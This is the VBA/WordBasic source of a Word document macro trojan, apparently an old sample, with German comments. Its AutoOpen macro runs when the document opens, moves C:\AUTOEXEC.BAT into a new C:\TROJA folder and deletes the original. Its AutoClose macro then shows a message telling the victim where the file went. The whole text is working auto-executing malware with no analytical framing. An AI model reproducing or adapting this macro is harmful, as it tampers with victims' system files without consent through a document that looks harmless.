   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim M$
   Rem Hinweis zum AutoOpen-Makro
   Rem x name deleted  x
     M$ = "Auf Wiederöffnen" + Chr(10) + Chr(10)
     M$ = M$ + "P.S.: Falls Sie Ihre AUTOEXEC.BAT - Datei" + Chr(10)
     M$ = M$ + "gerne wiederhaben möchten, sollten Sie einen" + Chr(10)
     M$ = M$ + "Blick in das neue Verzeichnis C:\TROJA werfen..."
     WordBasic.MsgBox M$, "AutoClose", 48
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Rem Dieses Makro legt das Verzeichnis C:\TROJA an und
   Rem verschiebt C:\AUTOEXEC.BAT dorthin
   Rem x name deleted  x
     On Error Resume Next
     WordBasic.MkDir "C:\TROJA"
     If WordBasic.[WW2_Files$]("C:\AUTOEXEC.BAT") <> "" Then
       If WordBasic.[WW2_Files$]("C:\TROJA\AUTOEXEC.BAT") <> "" Then
         WordBasic.Kill "C:\TROJA\AUTOEXEC.BAT"
       End If
       WordBasic.CopyFile "C:\AUTOEXEC.BAT", "C:\TROJA"
       WordBasic.Kill "C:\AUTOEXEC.BAT"
     End If
   End Sub
